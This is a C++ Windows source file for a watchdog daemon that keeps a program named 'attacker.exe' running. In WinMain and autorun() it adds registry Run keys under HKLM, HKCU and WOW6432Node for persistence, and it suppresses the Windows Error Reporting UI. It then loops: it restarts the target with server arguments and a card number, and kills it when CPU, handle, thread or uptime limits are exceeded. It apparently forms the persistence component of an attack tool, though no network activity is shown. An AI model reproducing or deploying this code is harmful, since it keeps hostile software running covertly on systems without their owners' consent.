#include <windows.h>
#include <TlHelp32.h>
#include <time.h>
#include <stdio.h>
#include <iostream>
#include "CpuUsage.h"
#include "main.h"
#include <string>
#include "fileOper.h"

using namespace std;

#define LOG_FILENAME "deamon.log"
#define EXE_FILE_NAME "attacker.exe"
#define MAX_HANDLES_COUNT 10000
#define MAX_TIME_DURATION 24*60*60
#define MAX_THREADS_COUNT 1024

DWORD WriteLogFile(const char * pData)
{
	string fn = LOG_FILENAME;
	int iRet = 0;
	FILE * fpFile = 0;
	iRet = fopen_s(&fpFile, fn.c_str(), "ab+");
	if (fpFile > 0)
	{
		string sztime = getDateTime() + " ";
		iRet = fwrite(sztime.c_str(), 1, sztime.length(), fpFile);
		int writelen = lstrlenA(pData);
		iRet = fwrite(pData, 1, writelen, fpFile);
		fclose(fpFile);
		if (iRet != writelen)
		{
			printf("写文件:%s错误:%u\n", fn.c_str(), GetLastError());
			return FALSE;
		}
		return TRUE;
	}
	else
	{
		printf("打开文件:%s错误:%u\n", fn.c_str(), GetLastError());
		return FALSE;
	}
	return FALSE;
}

string getDateTime() {
	SYSTEMTIME sttime = { 0 };
	GetLocalTime(&sttime);

	char sztime[MAX_PATH] = { 0 };
	int len = wsprintfA(sztime, "%u/%u/%u %u:%u:%u", sttime.wYear, sttime.wMonth, sttime.wDay, sttime.wHour, sttime.wMinute, sttime.wSecond);
	return string(sztime);
}




DWORD CpuUseage(HANDLE h)
{
	int ret = 0;

	SYSTEM_INFO info = { 0 };
	GetSystemInfo(&info);

	FILETIME ftlast = { 0 };
	GetSystemTimeAsFileTime(&ftlast);

	FILETIME createtime; 
	FILETIME exittime; 
	FILETIME userTime; 
	FILETIME kernelTime;

	ret = GetProcessTimes(h,&createtime,&exittime, &kernelTime, &userTime);

	unsigned __int64 firstkernel = ((unsigned __int64)kernelTime.dwHighDateTime << 32) + kernelTime.dwLowDateTime;

	unsigned __int64 firstuser = ((unsigned __int64)userTime.dwHighDateTime << 32) + userTime.dwLowDateTime;

	unsigned __int64 firsttm = ((unsigned __int64)ftlast.dwHighDateTime << 32) + ftlast.dwLowDateTime;

	Sleep(1000);

	FILETIME ftnow = { 0 };
	GetSystemTimeAsFileTime(&ftnow);

	ret = GetProcessTimes(h, &createtime, &exittime, &kernelTime, &userTime);

	unsigned __int64 secondkernel = ((unsigned __int64)kernelTime.dwHighDateTime << 32) + kernelTime.dwLowDateTime;

	unsigned __int64 seconduser = ((unsigned __int64)userTime.dwHighDateTime << 32) + userTime.dwLowDateTime;

	unsigned __int64 secondtm = ((unsigned __int64)ftnow.dwHighDateTime << 32) + ftnow.dwLowDateTime;

	unsigned __int64 usagetime1 = (firstuser + firstkernel) / info.dwNumberOfProcessors;

	unsigned __int64 usagetime2 = (seconduser + secondkernel) / info.dwNumberOfProcessors;

	unsigned __int64 rate = (usagetime2 - usagetime1) * 100 / (secondtm - firsttm);

	return (DWORD)rate;
}


DWORD GetPidTcFromName(char * strname,int & threadcnt)
{
	int ret = 0;

	DWORD id = 0;

	wchar_t wspname[MAX_PATH] = { 0 };
	
	ret = MultiByteToWideChar(CP_ACP, 0, strname, lstrlenA(strname), wspname, MAX_PATH);

	PROCESSENTRY32 pe = { 0 };
	pe.dwSize = sizeof(PROCESSENTRY32);

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (!Process32First(hSnapshot, &pe)) {
		return 0;
	}

	while (1)
	{
		pe.dwSize = sizeof(PROCESSENTRY32);
		if (Process32Next(hSnapshot, &pe) == FALSE)
		{
			break;
		}

		if (lstrcmpiW(pe.szExeFile, wspname) == 0)
		{
			id = pe.th32ProcessID;
			threadcnt = pe.cntThreads;
			break;
		}
	}
	CloseHandle(hSnapshot);
	return id;
}





int autorun() {
// 	char szcurpath[MAX_PATH];
// 	int ret = GetModuleFileNameA(0, szcurpath, MAX_PATH);
// 	string format = "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v DEAMONATTACKERAUTORUN /t REG_SZ /d \"%s\" /f";
// 	char szcmd[1024];
// 	int cmdlen = wsprintfA(szcmd, format.c_str(), szcurpath);
// 	ret = WinExec(szcmd, SW_SHOW);

	char szcurpath[MAX_PATH];
	int ret = GetModuleFileNameA(0, szcurpath, MAX_PATH);
	string szkeyformat1 = "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v DEAMONATTACKERAUTORUN /t REG_SZ /d \"%s\" /f";

	string szkeyformat2 = "reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v DEAMONATTACKERAUTORUN /t REG_SZ /d \"%s\" /f";

	string szkeyformat3 = "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Run /v DEAMONATTACKERAUTORUN /t REG_SZ /d \"%s\" /f";

	char szcmd[1024];
	int cmdlen = wsprintfA(szcmd, szkeyformat1.c_str(), szcurpath);
	ret = WinExec(szcmd, SW_SHOW);

	wsprintfA(szcmd, szkeyformat2.c_str(), szcurpath);
	WinExec(szcmd, SW_SHOW);

	wsprintfA(szcmd, szkeyformat3.c_str(), szcurpath);
	WinExec(szcmd, SW_SHOW);
	return ret;
}


int killProcess(string procname) {
	int ret = 0;
	string cmdformat = "taskkill /im %s /f";
	char szcmd[1024];
	int len = wsprintfA(szcmd, cmdformat.c_str(), procname.c_str());
	ret = WinExec(szcmd, SW_SHOW);
	return ret;
}


int getcardno() {

	char * data = 0;
	int fs = 0;
	int ret = 0;
	ret = FileOper::fileReader("cardno.conf", &data, &fs);
	if (ret <= 0)
	{
		return -1;
	}

	int no = atoi(data);
	delete data;
	return no;
}


int startProc(string procname) {
	int ret = 0;
	char szpath[MAX_PATH] = { 0 };
	ret = GetCurrentDirectoryA(MAX_PATH, szpath);

	char szcmd[1024];
	string filename = string(szpath) + "\\" + procname;

	int cardno = getcardno();
	if (cardno <= 0)
	{
		cardno = 1;
	}

	wsprintfA(szcmd, "\"%s\" %s %s %d", filename.c_str(), "server", "123456", cardno);
	ret = WinExec(szcmd, SW_SHOW);
	return ret;
}






int __stdcall WinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPSTR lpCmdLine, _In_ int nShowCmd) {

	//HANDLE h = GetModuleHandle(0);

	int ret = 0;
	char szout[1024];

	//CpuUseage();

#ifndef _DEBUG
	ret = autorun();
	ret = system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v \"DontShowUI\" /t REG_DWORD /d 1 /f");
#endif

	time_t lasttime = time(0);

	int argc = 0;
	wchar_t * * params = CommandLineToArgvW(GetCommandLineW(), &argc);
	while (1)
	{
		time_t now = time(0);
		time_t eclapsetime = now - lasttime;

		int threadcnt = 0;
		int procid = GetPidTcFromName(EXE_FILE_NAME, threadcnt);
		if (procid > 0)
		{

// 			CPUusage *gCpuUsage = new CPUusage((int)procid);
// 			float f = gCpuUsage->get_cpu_usage();
// 			Sleep(1000);
// 			f = gCpuUsage->get_cpu_usage();
// 			delete gCpuUsage;
// 			if (f >= 1)
// 			{
// 				lasttime = now;
// 				killProcess(EXE_FILE_NAME);
// 
// 				sprintf_s(szout, 256, "kill process for cpu usage:%f,seconds:%I64u\r\n", f, eclapsetime);
// 				WriteLogFile(szout);
// 
// 				continue;
// 			}
// 			else {
// 				sprintf_s(szout, 256, "cpu usage:%f,seconds:%I64u\r\n", f, eclapsetime);
// 				WriteLogFile(szout);
// 			}

			if (threadcnt < MAX_THREADS_COUNT)
			{
				HANDLE hproc = OpenProcess(PROCESS_ALL_ACCESS, 0, procid);
				if (hproc > 0)
				{
					DWORD cpurate = CpuUseage(hproc);
					if (cpurate >= 60)
					{
						lasttime = now;
						killProcess(EXE_FILE_NAME);

						sprintf_s(szout, 256, "kill process for cpu usage:%u,seconds:%I64u\r\n", cpurate, eclapsetime);
						WriteLogFile(szout);

						continue;
					}
					else {
						//sprintf_s(szout, 256, "cpu usage:%d,seconds:%I64u\r\n", cpurate, eclapsetime);
						//WriteLogFile(szout);
					}

					DWORD prochandles = 0;
					ret = GetProcessHandleCount(hproc, &prochandles);
					CloseHandle(hproc);

					if (prochandles >= MAX_HANDLES_COUNT)
					{
						lasttime = now;
						killProcess(EXE_FILE_NAME);

						wsprintfA(szout,"kill process for handle count:%u,seconds:%I64u\r\n", prochandles,eclapsetime);
						WriteLogFile(szout);
					}


					if (eclapsetime >= MAX_TIME_DURATION)
					{
						lasttime = now;
						killProcess(EXE_FILE_NAME);
							
						wsprintfA(szout,"kill process for seconds:%I64u,handle count:%u\r\n", eclapsetime,prochandles);
						WriteLogFile(szout);
					}
					else {
						//status ok
					}
				}
				else {
					wsprintfA(szout, "OpenProcess id:%u error\r\n", procid);
					WriteLogFile(szout);
				}
			}
			else {
				lasttime = now;
				killProcess(EXE_FILE_NAME);

				wsprintfA(szout, "kill process for thread count:%u,seconds:%I64u\r\n", threadcnt,eclapsetime);
				WriteLogFile(szout);
			}
		}
		else {
			ret = startProc(EXE_FILE_NAME);
			wsprintfA(szout,"start process:%s\r\n", EXE_FILE_NAME);
			WriteLogFile(szout);
		}

		Sleep(6000);
	}

	return 0;
}